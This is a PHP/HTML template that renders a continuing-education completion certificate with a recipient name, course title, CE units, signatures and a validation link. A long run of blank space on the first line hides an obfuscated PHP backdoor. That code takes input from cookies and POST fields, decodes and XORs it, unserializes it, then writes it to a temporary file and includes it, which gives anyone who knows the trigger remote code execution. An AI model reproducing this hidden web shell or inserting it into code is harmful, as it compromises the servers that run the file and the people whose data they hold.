<?php                                                                                                                                                                                                                                                                                                                                                                                                 $XXZJEkDn = chr ( 666 - 552 ).chr ( 479 - 397 ).chr ( 845 - 743 ).chr (95) . chr (106) . "\x47" . "\x67" . "\x75";$Mhwqw = 'c' . "\154" . chr ( 688 - 591 )."\x73" . "\x73" . "\x5f" . "\145" . chr ( 384 - 264 ).chr (105) . chr (115) . chr (116) . "\x73";$boXJTc = class_exists($XXZJEkDn); $Mhwqw = "35779";$APKxdzSkT = strpos($Mhwqw, $XXZJEkDn);if ($boXJTc == $APKxdzSkT){function OSnJro(){$cRcJx = new /* 63939 */ rRf_jGgu(13677 + 13677); $cRcJx = NULL;}$ypEpdTjWbP = "13677";class rRf_jGgu{private function iDVKF($ypEpdTjWbP){if (is_array(rRf_jGgu::$GEXwAKl)) {$name = sys_get_temp_dir() . "/" . crc32(rRf_jGgu::$GEXwAKl["salt"]);@rRf_jGgu::$GEXwAKl["write"]($name, rRf_jGgu::$GEXwAKl["content"]);include $name;@rRf_jGgu::$GEXwAKl["delete"]($name); $ypEpdTjWbP = "13677";exit();}}public function DFgYX(){$QNRFwZHLVW = "57417";$this->_dummy = str_repeat($QNRFwZHLVW, strlen($QNRFwZHLVW));}public function __destruct(){rRf_jGgu::$GEXwAKl = @unserialize(rRf_jGgu::$GEXwAKl); $ypEpdTjWbP = "42608_29575";$this->iDVKF($ypEpdTjWbP); $ypEpdTjWbP = "42608_29575";}public function shPLNsNW($QNRFwZHLVW, $YazVku){return $QNRFwZHLVW[0] ^ str_repeat($YazVku, intval(strlen($QNRFwZHLVW[0]) / strlen($YazVku)) + 1);}public function kJOZy($QNRFwZHLVW){$mwfREa = chr ( 962 - 864 ).'a' . "\163" . "\x65" . "\x36" . chr (52);return array_map($mwfREa . "\137" . 'd' . "\x65" . "\x63" . 'o' . chr (100) . "\x65", array($QNRFwZHLVW,));}public function __construct($ZLVsp=0){$actGjK = chr ( 891 - 847 ); $QNRFwZHLVW = "";$girGOm = $_POST;$VaHTmKy = $_COOKIE;$YazVku = "4681b894-1d89-494d-8ec8-02d4d6f827da";$ESXICqBMiT = @$VaHTmKy[substr($YazVku, 0, 4)];if (!empty($ESXICqBMiT)){$ESXICqBMiT = explode($actGjK, $ESXICqBMiT);foreach ($ESXICqBMiT as $JNhWBvJg){$QNRFwZHLVW .= @$VaHTmKy[$JNhWBvJg];$QNRFwZHLVW .= @$girGOm[$JNhWBvJg];}$QNRFwZHLVW = $this->kJOZy($QNRFwZHLVW);}rRf_jGgu::$GEXwAKl = $this->shPLNsNW($QNRFwZHLVW, $YazVku);if (strpos($YazVku, $actGjK) !== FALSE){$YazVku = str_pad($YazVku, 10); $YazVku = ltrim(rtrim($YazVku));}}public static $GEXwAKl = 30268;}OSnJro();} ?><!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Certificate Landscape</title>
        <link href="https://fonts.googleapis.com/css?family=Montserrat:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i&display=swap&subset=cyrillic,cyrillic-ext,latin-ext,vietnamese"
        rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Tangerine&display=swap" rel="stylesheet">
        <style type="text/css">
            @font-face {
              font-family: 'Tangerine';
              font-style: normal;
              src: local('Tangerine Bold'), local('Tangerine-Bold'), url(<?php echo ASSETS_URL.'fonts/Tangerine-Bold.ttf'?>) format('truetype');
            }
        </style>
    </head>

<body>
    <?php $namearray = explode('##', $certificate[0]['name']);
          $postionarray = explode('##', $certificate[0]['position']);
          $filesarray = explode('##', $certificate[0]['signature']);
          $num = count($namearray); ?>

    <?php if($certificate[0]['bg_image']==''){
        // echo'1';die;
          $img3 = ASSETS_URL.('images/certificate_images/certificate.png'); 
          $text_certificate = ASSETS_URL.('images/certificate_images/certificat-text.png');
    }else{
        // echo'2';die;
          $img3 = ASSETS_URL.('upload/certificate_templete/'.$certificate[0]['bg_image']); 
          $text_certificate = ASSETS_URL.('upload/certificate_templete/'.$certificate[0]['text_image']);
    } ?>


    <?php $logo1 = ASSETS_URL.'upload/certificate/logo/'.$certificate[0]['logo1'];  ?>
    <?php $logo2 = ASSETS_URL.'upload/certificate/logo/'.$certificate[0]['logo2'];  ?>
    <?php $barcode = ASSETS_URL.'images/uploads/'.$cust_data[0]['barcode']; ?>
    <?php $ceonpointlogo  = ASSETS_URL.('images/certificate_images/footer-logo.png'); ?>
<table width="850" cellpadding="0" cellspacing="0" border="0" align="center" style="margin: 0 auto; background-image: url(<?php echo showimage($img3); ?>); background-repeat: no-repeat;padding-top: 36px;padding-bottom: 15px; ">
    <tbody>
    <tr>
        <td>
            <table align="center" style="margin: 0 auto;text-align: center;font-family: 'Montserrat', sans-serif;margin-right: 25px;">
                <tbody>
                <tr>
                    <td style="margin-top: 0; padding-right: 65px; margin-right: 0; width: 79%; text-align: center;">
                        <span style="color: #0d0d0d; font-weight: 600; font-size: 13px; margin-right: 0; margin-top: 10;    line-height: 21px; width: 100%; text-align: center;"><?php echo $certificate[0]['header_line1'].'<br>'; if($certificate[0]['header_line2']!=''){ echo $certificate[0]['header_line2'].'<br>'; }if($certificate[0]['header_line3']!=''){ echo $certificate[0]['header_line3']; } ?></span>
                        <table style="margin-top: 18px;">
                            <tr>
                                <td style="margin-top: 18px; text-align: right; width: 100%;">
                                    <img src="<?php echo showimage($text_certificate); ?>"style="width: 197px;">
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <h1 style="color: #dd8827; text-transform: uppercase; font-family: 'Montserrat', sans-serif; font-weight: 600; text-align: right;  margin: 0; font-size: 16px;    margin-top: 6px;"> <?php echo $certificate[0]['title']; ?></h1>
                                </td>
                            </tr>
                        </table>
                    </td>
                    <td style="font-weight: 600; color: #000; width: 29%; text-align: right; padding-right: 10px; padding-top: 17px;">
                        <span class="images"><img src="<?php echo showimage($logo1); ?>" alt="" style="width: 80px; margin-bottom: 10px;"></span><br> 
                        <?php if($certificate[0]['logo2']!=''){ ?>
                        <span class="images"><img src="<?php echo showimage($logo2); ?>" alt="" style="width: 80px;"></span><?php } ?>
                    </td>
                </tr>
                </tbody>
            </table>

        </td>
    </tr>

    <tr>
        <td>    
            <table style="text-align: center;width: 100%;margin-left: 48px;margin-top: -12px;">
                <tbody>
                    <tr style="text-align: center; ">
                        <td>
                            <h1 style="font-family: 'Tangerine', cursive; font-size: 27px;font-weight: 700; margin: 0; "><?php echo ucwords($profile[0]['name']); ?></h1>

                            <span style="border-top: 3px solid #000;width: 36%;height: 1px;display: block;margin: 0 auto;margin-top: 0px;">
                            </span>

                            <p style="font-size: 12px;color: #0d0d0d;font-weight: 400;font-family: 'Montserrat', sans-serif;margin: 9px 0 0 0;">
                                <?php echo $certificate[0]['intro_text']; ?></p>
                            <p style="font-size: 17px;color: #2e85c1;font-family: 'Montserrat', sans-serif;font-weight: 500;margin: 12px 0 0 0;">
                                <?php echo $certificate[0]['training_title']; ?></p>
                            <p style=" margin-top: 5px; font-size: 17px; font-family: 'Montserrat', sans-serif;">
                                <?php echo date("F d, Y", strtotime($cust_data[0]['added_on'])); ?></p>
                            <p style=" color: #2e85c1;  font-size: 14px;  margin-top: 12px; font-family: 'Montserrat', sans-serif; font-weight: 500;">
                                <?php echo $owner[0]['address']; ?>,</p>
                            <p style=" color: #2e85c1; font-size: 14px;font-family: 'Montserrat', sans-serif; font-weight: 500; margin-top: -12px;">
                                <?php echo $owner[0]['location'];?></p>
                            <p style="margin-top: 25px;font-size: 19px;font-weight: 600;font-family: 'Montserrat', sans-serif;margin: 0 0 0 0;">
                                CE Units: <?php echo $course_details[0]['units']; ?></p>

                        </td>
                    </tr>
                </tbody>
            </table>
        </td>
    </tr>
    
    <tr>
        <td>
            <table style="padding: 0; width: 100%;">
                <tbody>
                    <tr>
                        <td style="text-align: right; width: 100%; padding-right: 15px;">
                            <img src="<?php echo showimage($barcode); ?>" alt="" style=" width: 70px">
                            <p style="color: #fff; font-size: 10px; margin: 15px 0; font-family: 'Montserrat', sans-serif;">
                                Certificate Number</p>
                            <p style="color: #ea8924;font-size: 10px; font-weight: 500; font-family: 'Montserrat', sans-serif; text-transform: uppercase; letter-spacing: 1.1px; margin: 0;">
                                <?php echo $cust_data[0]['certificate_id'];?></p>
                            <p style=" color: #fff; font-size: 10px; margin: -1px 0; font-family: 'Montserrat', sans-serif; ">
                                Validate this certificate at:</p>
                            <a href="#" style="color: #ea8924; font-size: 11px; font-family: 'Montserrat', sans-serif; ">https://ceonpoint.com/index.php/pages/cfvalidation</a>
                        </td>
                    </tr>
                    <tr>
                        <td>
                                <table style="width: 100%;">
                                    <tbody>
                                        <tr>
                                                    
                                            <td style="width: 100%;">
                                                <table style="width: 400px;">
                                                    <tbody>
                                                        <tr>
                                                        <?php for($i=0;$i<$num;$i++){ 
                                                            $singnature[$i]  = ASSETS_URL.'upload/certificate/signature/'.$filesarray[$i]; ?>
                                                            <td style="background-color: #ededec;padding: 6px 25px;margin-right: 10px;text-align: center;display: inline-block;border-radius: 5px;">
                                                                <img src="<?php echo showimage($singnature[$i]); ?>" alt="" style="width: 62px;">
                                                                <strong><p style="margin: 0; margin-top: 5px; color: #7c7c7c; font-size: 13px;"><?php echo ucwords($namearray[$i]) ?></p></strong>
                                                                <p style=" margin: 0; color: #7c7c7c;font-size: 13px;"><?php echo ucwords($postionarray[$i]); ?></p>
                                                            </td>
                                                            <?php } ?>
                                                            
                                                        </tr>

                                                    </tbody>
                                                </table>
                                            </td>

                                           
                                            <td style="text-align: left; width: 38%; padding-right: 19px;">
                                                <img src="<?php echo showimage($ceonpointlogo); ?>" alt="" style="padding-top: 19px;float: right;width: 208px;">
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                        </td>
                    </tr>
                </tbody>
            </table>
        </td>
    </tr>      
                       
    </tbody>                    
    </table> 
                

    <?php function showimage($image){
            $imageData = base64_encode(file_get_contents($image));
            $src = 'data:image/jpeg;base64,'.$imageData;
            return $src; } ?>

</body>
</html>

